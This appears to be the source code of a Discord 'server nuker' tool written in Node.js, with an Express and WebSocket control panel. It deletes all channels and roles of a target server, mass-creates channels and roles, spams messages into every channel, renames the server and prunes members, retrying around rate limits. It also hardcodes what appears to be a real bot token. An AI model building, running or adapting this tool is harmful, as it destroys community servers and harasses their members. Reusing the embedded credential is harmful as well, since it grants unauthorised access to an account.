console.log("server setup started...")


let bot = {}

let socket1

let token = "Bot MTQwNTI4Mzc0NzIyNTUzNDcwOA.GCRFsA.mU7CMURmg0garIKhgBP72ZW5F_Mo-Kg25qxBOU"


//create channel
function create_channel(name){
    fetch(`https://discord.com/api/v9/guilds/${bot.target_guild}/channels`,{
        headers:{"Content-Type":"application/json",authorization:token},
        body:JSON.stringify({name:name,type:0}),
        method:"POST"
    }).then((response)=>{
        if (response.status==429){
            socket1.send(`Failed to create channel with name: ${name} due to api rate limit, trying again`)
            setTimeout(()=>{create_channel(name)},4000)
        }else{
            socket1.send(`created channel with name: ${name}`)
        }
    })
}
//delete channel
function delete_channel(id){
    fetch(`https://discord.com/api/v9/channels/${id}`,{
        headers:{"Content-Type":"application/json",authorization:token},
        method:"DELETE"
    }).then((response)=>{
        if (response.status==429){
            socket1.send(`Failed to delete channel with id: ${id} due to api rate limit, trying again`)
            setTimeout(()=>{delete_channel(id)},4000)
        }else{
            socket1.send(`deleted channel with id: ${id}`)
        }
    })
}
//create role
function create_role(name){
    fetch(`https://discord.com/api/v9/guilds/${bot.target_guild}/roles`,{
        headers:{"Content-Type":"application/json",authorization:token},
        body:JSON.stringify({name:name}),
        method:"POST"
    }).then((response)=>{
        if (response.status==429){
            socket1.send(`Failed to create role with name: ${name} due to api rate limit, trying again`)
            setTimeout(()=>{create_role(name)},4000)
        }else{
            socket1.send(`created role with name: ${name}`)
        }
    })
}
//delete role
function delete_role(id){
    fetch(`https://discord.com/api/v9/guilds/${bot.target_guild}/roles/${id}`,{
        headers:{"Content-Type":"application/json",authorization:token},
        method:"DELETE"
    }).then((response)=>{
        if (response.status==429){
            socket1.send(`Failed to delete with id: ${id} due to api rate limit, trying again`)
            setTimeout(()=>{delete_role(id)},4000)
        }else{
            socket1.send(`deleted role with id: ${id}`)
        }
    })
}
//edit server
function edit_server(name){
    fetch(`https://discord.com/api/v9/guilds/${bot.target_guild}`,{
        headers:{"Content-Type":"application/json",authorization:token},
        method:"PATCH",
        body:JSON.stringify({name:name})
    }).then((response)=>{
        if (response.status==429){
            socket1.send(`Failed to edit server name to: ${name} due to api rate limit, trying again`)
            setTimeout(()=>{edit_server(name)},4000)
        }else{
            socket1.send(`edited server name to ${name}`)
        }
    })
}
//message send
function message_send(channel, content){
    fetch(`https://discord.com/api/v9/channels/${channel}/messages`,{
        headers:{"Content-Type":"application/json",authorization:token},
        method:"POST",
        body:JSON.stringify({content:content})
    }).then((response)=>{
        if (response.status==429){
            socket1.send(`Failed to send message due to api rate limit, trying again`)
            setTimeout(()=>{message_send(channel, content)},4000)
        }else{
            socket1.send(`message sent`)
        }
    })
}
//prune
function prune(){
    fetch(`https://discord.com/api/v9/guilds/${bot.target_guild}/prune`,{
        method:"POST",
        headers:{"Content-Type":"application/json",authorization:token},
        body:JSON.stringify({compute_prune_count:false,days:1})
    })
}
//get channels
async function get_channels(){
    let resp = await fetch(`https://discord.com/api/v9/guilds/${bot.target_guild}/channels`,{
        headers:{authorization:token},
        method:"GET"
    })
    if (resp.status==429){
        socket1.send(``)
    }
    data = await resp.json()
    return data
}
//get roles
async function get_roles(){
    let resp = await fetch(`https://discord.com/api/v9/guilds/${bot.target_guild}/roles`,{
        headers:{authorization:token},
        method:"GET"
    })
    if (resp.status==429){
        socket1.send(`failed to fetch roles list`)
    }
    data = await resp.json()
    return data
}
console.log("initialized the bot client")




const express = require("express")

const app = express()


app.use(express.urlencoded({extended: false}))
app.use(express.json())



//set token
app.post("/set-token",(req,res)=>{
    try{
        token = req.body.token
        bot.target_guild = req.body.guild
        res.send({success:true})
    }
    catch{
        res.send({success:false})
    }
})


//do actions
app.post("/action",async (req,res)=>{
    let action = req.body.action

    //1
    if (action=="clear_channels"){
        let channels = await get_channels()
        for (let i = 0; i < channels.length; i++){
            let channel = channels[i]
            delete_channel(channel.id)
            console.log(`deleting ${channel.name}...`)
        }
    }
    //2
    else if (action=="clear_roles"){
        let channels = await get_roles()
        for (let i = 0; i < channels.length; i++){
            let channel = channels[i]
            delete_role(channel.id)
            console.log(`deleting ${channel.name}...`)
        }
    }
    //3
    else if (action=="create_channel"){
        for (let i = 0; i < req.body.count; i++){
            create_channel(req.body.name)
        }
    }
    //4
    else if (action=="create_role"){
        for (let i = 0; i < req.body.count; i++){
            create_role(req.body.name)
        }
    }
    //5
    else if (action=="spam_message"){
        let channels = await get_channels()
        for (let c = 0; c < channels.length; c++){
            let channel = channels[c]
            for (let i = 0; i < req.body.count; i++){
                message_send(channel.id,req.body.content)
            }
        }
    }
    //6
    else if (action=="rename"){
        edit_server(req.body.name)
    }
    //7
    else if (action=="prune") prune()



    res.send({success:true})
})



//alive check
app.get("/",async (req,res)=>{
    res.send(`<html><head><style>body{    background-image: linear-gradient(to bottom right, rgb(0, 0, 80), rgb(80, 0, 0));}#mytext{    color:white;    position: relative;    top: 40%;    font: menu;    font-size: 24;}</style></head><body><center><p id="mytext">IM ALIVE</p></center></body></html>`)
})


//app run
app.get("/app",async (req,res)=>{
    res.sendFile(`${process.cwd().replace("\\","/")}/res/index.html`)
})




const {WebSocketServer} = require("ws")

const server = new WebSocketServer({
    port: 25566
})

server.on("connection",(socket)=>{
    socket.send("Websocket Connection successful")
    socket.send("Welcome to Zoom Nuk3r discord server nuker tool")
    socket1 = socket
    socket.on("close",()=>{
        exit()
    })
})




app.listen(25565)//ψ i don't believe in god